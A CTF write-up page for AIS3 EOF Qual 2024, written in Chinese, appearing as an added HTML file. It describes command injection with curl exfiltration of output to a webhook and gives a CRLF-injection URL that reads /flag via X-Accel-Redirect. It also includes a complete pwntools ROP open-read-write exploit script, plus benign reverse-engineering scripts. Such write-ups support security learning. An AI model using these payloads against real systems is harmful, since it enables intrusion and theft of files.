@@ -1,0 +1,1558 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://shallowfeather.github.io/writeup/AIS3-EOF-Qual-2024-writeup/">
+      
+      
+        <link rel="prev" href="../../tools/">
+      
+      
+        <link rel="next" href="../AIS3-Pre-Exam-2023-writeup/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.44">
+    
+    
+      
+        <title>AIS3 EOF Qual 2024 writeup - ShallowFeather's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#web" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="ShallowFeather&#39;s Blog" class="md-header__button md-logo" aria-label="ShallowFeather's Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            ShallowFeather's Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              AIS3 EOF Qual 2024 writeup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tools/" class="md-tabs__link">
+        
+  
+    
+  
+  Tools Usage
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  WriteUp
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="ShallowFeather&#39;s Blog" class="md-nav__button md-logo" aria-label="ShallowFeather's Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    ShallowFeather's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tools Usage
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    WriteUp
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            WriteUp
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    AIS3 EOF Qual 2024
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    AIS3 EOF Qual 2024
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns-lookup-tool-final" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS Lookup Tool: Final
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#internal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Internal
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto" class="md-nav__link">
+    <span class="md-ellipsis">
+      Crypto
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Crypto">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#baby-rsa" class="md-nav__link">
+    <span class="md-ellipsis">
+      Baby RSA
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pwn
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pwn">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jackpot" class="md-nav__link">
+    <span class="md-ellipsis">
+      jackpot
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#contextarchi386-oslinux-log_leveldebug" class="md-nav__link">
+    <span class="md-ellipsis">
+      context(arch='i386', os='linux', log_level='debug')
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#r-remote1721802-1224" class="md-nav__link">
+    <span class="md-ellipsis">
+      r = remote("172.18.0.2", 1224)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#r-remote10105021-12978" class="md-nav__link">
+    <span class="md-ellipsis">
+      r = remote("10.105.0.21" ,12978)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#r-processjackpot" class="md-nav__link">
+    <span class="md-ellipsis">
+      r = process("./jackpot")
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lib-elflibx86_64-linux-gnulibcso6" class="md-nav__link">
+    <span class="md-ellipsis">
+      lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#libc-intrrecvline-1-16-0x29d90" class="md-nav__link">
+    <span class="md-ellipsis">
+      libc = int(r.recvline()[:-1], 16) - 0x29d90
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printhexlibc" class="md-nav__link">
+    <span class="md-ellipsis">
+      print(hex(libc))
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gdbattachr" class="md-nav__link">
+    <span class="md-ellipsis">
+      gdb.attach(r)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gdbattachr_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      gdb.attach(r)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#a-rrecv" class="md-nav__link">
+    <span class="md-ellipsis">
+      a = r.recv()
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printa" class="md-nav__link">
+    <span class="md-ellipsis">
+      print(a)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="print(a)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stateful" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stateful
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#include" class="md-nav__link">
+    <span class="md-ellipsis">
+      include
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="include">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bam" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bam
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AIS3-Pre-Exam-2023-writeup/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AIS3 Pre Exam 2023
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HITCON-2023-Qual-Crazy-Arcade/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HITCON 2023 Qual
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TeamT5-%E9%87%A3%E9%AD%9A%E9%81%8A%E6%88%B2-WriteUp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    TeamT5 釣魚遊戲
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TeamT5-camp-writeup/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    TeamT5 camp
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns-lookup-tool-final" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS Lookup Tool: Final
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#internal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Internal
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto" class="md-nav__link">
+    <span class="md-ellipsis">
+      Crypto
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Crypto">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#baby-rsa" class="md-nav__link">
+    <span class="md-ellipsis">
+      Baby RSA
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pwn
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pwn">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jackpot" class="md-nav__link">
+    <span class="md-ellipsis">
+      jackpot
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#contextarchi386-oslinux-log_leveldebug" class="md-nav__link">
+    <span class="md-ellipsis">
+      context(arch='i386', os='linux', log_level='debug')
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#r-remote1721802-1224" class="md-nav__link">
+    <span class="md-ellipsis">
+      r = remote("172.18.0.2", 1224)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#r-remote10105021-12978" class="md-nav__link">
+    <span class="md-ellipsis">
+      r = remote("10.105.0.21" ,12978)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#r-processjackpot" class="md-nav__link">
+    <span class="md-ellipsis">
+      r = process("./jackpot")
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lib-elflibx86_64-linux-gnulibcso6" class="md-nav__link">
+    <span class="md-ellipsis">
+      lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#libc-intrrecvline-1-16-0x29d90" class="md-nav__link">
+    <span class="md-ellipsis">
+      libc = int(r.recvline()[:-1], 16) - 0x29d90
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printhexlibc" class="md-nav__link">
+    <span class="md-ellipsis">
+      print(hex(libc))
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gdbattachr" class="md-nav__link">
+    <span class="md-ellipsis">
+      gdb.attach(r)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gdbattachr_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      gdb.attach(r)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#a-rrecv" class="md-nav__link">
+    <span class="md-ellipsis">
+      a = r.recv()
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printa" class="md-nav__link">
+    <span class="md-ellipsis">
+      print(a)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="print(a)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stateful" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stateful
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#include" class="md-nav__link">
+    <span class="md-ellipsis">
+      include
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="include">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bam" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bam
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h2 id="web">Web</h2>
+<h3 id="dns-lookup-tool-final">DNS Lookup Tool: Final</h3>
+<p>一開始想說用 `` 來做截斷
+後面發現其實只要 $()抱著就可以用ㄌ
+然後後面用 curl 到 webhook 在就能輸指令了
+但後面遇到一個情況就是他指令的輸出不能包含空格或是換行
+而且 flag 文件也不叫 flag 所以不能直接上傳到其他地方 這我還發ticket 問QQ</p>
+<p>最後是用 POST -d 把 ls 的東西弄到 webhook 上後
+<img alt="1000000420" src="https://hackmd.io/_uploads/H1KdEGK_a.png" /></p>
+<p>再去 cat flag</p>
+<h3 id="internal">Internal</h3>
+<p>有找到一篇 Orange 的 writeup
+https://blog.orange.tw/2014/02/olympic-ctf-2014-curling-200-write-up.html?m=1</p>
+<p>所以輸入<code>http://10.105.0.21:11181/?redir=https://google.com/%0d%0aX-Accel-Redirect:/flag</code></p>
+<h2 id="crypto">Crypto</h2>
+<h3 id="baby-rsa">Baby RSA</h3>
+<p>透過大一上學期的離散課程
+知道中國餘式定理的算法</p>
+<p>然後就看了一下 Edu-Ctf 的影片
+知道說如果密文相同有 n1, n2, n3 和 c1, c2, c3 便能解出密文
+利用一個叫做 broadcast attack 的東西
+利用 sage 就能解開了
+<img alt="螢幕擷取畫面 2024-01-06 140212" src="https://hackmd.io/_uploads/rk6Hlydu6.png" /></p>
+<h2 id="pwn">Pwn</h2>
+<h3 id="jackpot">jackpot</h3>
+<p>首先 他會先輸入一個數字 然後那個數字可以把 stack 中的東西輸出出來
+透過 gdb 跑到定位後 然後輸出 stack 找到 __libc_start_main+2XX</p>
+<p>然後就能夠透過這個 去剪掉 0x29d90 去拿到 libc 的 base address</p>
+<p>然後就能夠去串 ROP 做 ORW 了</p>
+<p>不過由於它的長度限制 0x100 所以當初我修改了很久讓他滿足長度
+把該拔的拔掉
+還有 flag 字串有出現在程式中所以我直接拿來使用
+最後就能拿到 flag 了</p>
+<p>```py=
+from pwn import *
+from time import *</p>
+<h1 id="contextarchi386-oslinux-log_leveldebug">context(arch='i386', os='linux', log_level='debug')</h1>
+<p>context(arch = 'amd64', os = 'linux')</p>
+<p>context.terminal = ['tmux', 'splitw', '-h']</p>
+<h1 id="r-remote1721802-1224">r = remote("172.18.0.2", 1224)</h1>
+<h1 id="r-remote10105021-12978">r = remote("10.105.0.21" ,12978)</h1>
+<h1 id="r-processjackpot">r = process("./jackpot")</h1>
+<p>r = remote("10.105.0.21", 12767)
+lib = ELF("./libc.so.6")</p>
+<h1 id="lib-elflibx86_64-linux-gnulibcso6">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</h1>
+<p>r.recvuntil(b': ')
+r.sendline("31")
+r.recvuntil('ticket')
+a = int(r.recv(16), 16)
+print(hex(a))</p>
+<h1 id="libc-intrrecvline-1-16-0x29d90">libc = int(r.recvline()[:-1], 16) - 0x29d90</h1>
+<h1 id="printhexlibc">print(hex(libc))</h1>
+<p>libc = a - 0x29d90</p>
+<h1 id="gdbattachr">gdb.attach(r)</h1>
+<p>r.recvuntil(":")</p>
+<p>exita = 0x0401120
+leave = 0x0401438
+bss = 0x0000000000404180</p>
+<p>pop_rsi = libc + 0x000000000002be51
+pop_rdi = libc + 0x000000000002a3e5
+pop_rdx = libc + 0x00000000000796a2
+flag = 0x040201f</p>
+<p>sys_write = libc + lib.sym['write']
+sys_open = libc + lib.sym['open']
+sys_read = libc + lib.sym['read']</p>
+<h1 id="gdbattachr_1">gdb.attach(r)</h1>
+<p>r.sendline(b"A" * (0x78) + flat(
+  pop_rdi, flag,
+  pop_rsi, 0,
+  sys_open,
+  pop_rdi, 3,
+  pop_rsi, bss + 0x50,
+  pop_rdx, 0x30,
+  sys_read,
+  pop_rdi, 1,
+  #pop_rsi, bss + 0x50,
+  sys_write,
+  leave
+))
+a = r.recvline()</p>
+<p>print(a)</p>
+<h1 id="a-rrecv">a = r.recv()</h1>
+<h1 id="printa">print(a)</h1>
+<p>r.interactive()</p>
+<pre><code>![image](https://hackmd.io/_uploads/ByJ7Myu_6.png)
+
+
+## Reverse
+
+### Flag Generator
+打開之後他會把一個 exe 的所有資料寫在 memory 中然後再刪掉
+所以只要在他刪掉前 把記憶體內容弄出來 執行 就能拿到 flag 了
+![image](https://hackmd.io/_uploads/HyC5MJOdT.png)
+
+
+### PixelClicker
+看到這題我第一個想到的是 flareOn9 的一題
+然後原本以為他上面寫的是位置後面才發現原來是顏色
+decompile後以為照他上面寫的 只要按兩次就能拿到flag
+然後發現它裡面有一塊會用來決定是否符合的顏色
+![image](https://hackmd.io/_uploads/H11imkdOp.png)
+r9d 是自己的內容
+rax 是他比較的內容
+原本寫了一個程式來按照順序讓他點出每次點哪個點
+標成黑色
+後面發現少看一塊code
+![image](https://hackmd.io/_uploads/BywgEk__p.png)
+
+```py=
+
+
+from PIL import Image
+
+def process_image(input_image_path, output_image_path, color_list_path):
+    # 讀取圖片
+    image = Image.open(input_image_path)
+    width, height = 2000, 2000
+
+    # 讀取顏色列表
+    with open(&quot;a.bin&quot;, 'rb') as f:
+        data = f.read()
+
+    print(hex(data[0]))
+    color_list = []
+    print(len(data))
+    for i in range(int(len(data) / 4)):
+        a = [data[4 * i], data[4 * i + 1], data[4*i+2], data[4*i+3]]
+        b = tuple(a)
+        color_list.append(b)
+    # 創建一個新的圖片，初始全部為白色
+    new_image = Image.new('RGB', (width, height), 'white')
+    for i in range(0, len(color_list)):
+        a = i % 600 + 0x28a
+        b = int(i / 600)
+        print(a, b)
+        new_image.putpixel(((b, a)), (color_list[i][0], color_list[i][1], color_list[i][2]))
+        #new_image.putpixel((x, y), (0, 0, 0))  # 標記為黑色
+    new_image.save(output_image_path)
+
+    # 儲存新的圖片
+
+
+if __name__ == &quot;__main__&quot;:
+    input_image_path = &quot;pix.png&quot;  # 輸入圖片的路徑
+    output_image_path = &quot;output_image.jpg&quot;  # 輸出圖片的路徑
+    color_list_path = &quot;a.txt&quot;  # 顏色列表的路徑
+
+    process_image(input_image_path, output_image_path, color_list_path)
+</code></pre>
+<p>程式寫出來 搞定
+<img alt="image" src="https://hackmd.io/_uploads/Sy3yggOdT.png" /></p>
+<h3 id="stateful">Stateful</h3>
+<p>也跟 FlareOn9 某題很像
+就把他的code 弄出來
+然後在每個會對字串做更動的函數讓他輸出他是第幾個
+發現 ghidra 弄出來的順序就是他執行的順序
+共有50 個函數
+然後把 + 變成 - 到回去執行就有了
+工人智慧的勝利
+```cpp=</p>
+<h1 id="include">include <bits/stdc++.h></h1>
+<p>using namespace std;</p>
+<p>vector<int> param_1;</p>
+<p>void state_1978986903()</p>
+<p>{
+  cout &lt;&lt; 51 &lt;&lt; '\n';
+  param_1[5] = param_1[5] - param_1[0x14] - param_1[0x25];
+  return;
+}</p>
+<p>void state_3648003850()</p>
+<p>{
+  cout &lt;&lt; 50 &lt;&lt; '\n';
+  param_1[8] = param_1[8] - param_1[0x10] - param_1[0xe];
+  return;
+}</p>
+<p>void state_3420754995()</p>
+<p>{
+  cout &lt;&lt; 49 &lt;&lt; '\n';
+  param_1[0x11] = param_1[0x11] - param_1[0x18] - param_1[0x26];
+  return;
+}</p>
+<p>void state_557589375()</p>
+<p>{
+  cout &lt;&lt; 48 &lt;&lt; '\n';
+  param_1[0xf] = param_1[0xf] - param_1[8] - param_1[0x28];
+  return;
+}</p>
+<p>void state_71198295()</p>
+<p>{
+  cout &lt;&lt; 47 &lt;&lt; '\n';
+  param_1[0x25] = param_1[0x25] - param_1[0x10] - param_1[0xc];
+  return;
+}</p>
+<p>void state_126130845()</p>
+<p>{
+  cout &lt;&lt; 46 &lt;&lt; '\n';
+  param_1[4] = param_1[4] - param_1[0x16] - param_1[6];
+  return;
+}</p>
+<p>void state_3901233957()</p>
+<p>{
+  cout &lt;&lt; 45 &lt;&lt; '\n';
+  param_1[10] = param_1[10] + (param_1[0x16] + param_1[0xc]);
+  return;
+}</p>
+<p>void state_1843624184()</p>
+<p>{
+  cout &lt;&lt; 44 &lt;&lt; '\n';
+  param_1[0x12] = param_1[0x12] - param_1[0x1f] - param_1[0x1a];
+  return;
+}</p>
+<p>void state_794507810()</p>
+<p>{
+  cout &lt;&lt; 43 &lt;&lt; '\n';
+  param_1[0x17] = param_1[0x17] - param_1[0x27] - param_1[0x1e];
+  return;
+}</p>
+<p>void state_4130555047()</p>
+<p>{
+  cout &lt;&lt; 42 &lt;&lt; '\n';
+  param_1[4] = param_1[4] - param_1[0x19] - param_1[0x1b];
+  return;
+}</p>
+<p>void state_1929982570()</p>
+<p>{
+  cout &lt;&lt; 41 &lt;&lt; '\n';
+  param_1[0x25] = param_1[0x25] - param_1[0x12] - param_1[0x1b];
+  return;
+}</p>
+<p>void state_3907553856()</p>
+<p>{
+  cout &lt;&lt; 40 &lt;&lt; '\n';
+  param_1[0x29] = param_1[0x29] + (param_1[0x22] + param_1[3]);
+  return;
+}</p>
+<p>void state_3507844042()</p>
+<p>{
+  cout &lt;&lt; 39 &lt;&lt; '\n';
+  param_1[0xd] = param_1[0xd] - param_1[8] - param_1[0x1a];
+  return;
+}</p>
+<p>void state_2907124712()</p>
+<p>{
+  cout &lt;&lt; 38 &lt;&lt; '\n';
+  param_1[2] = param_1[2] - param_1[0x19] - param_1[0x22];
+  return;
+}</p>
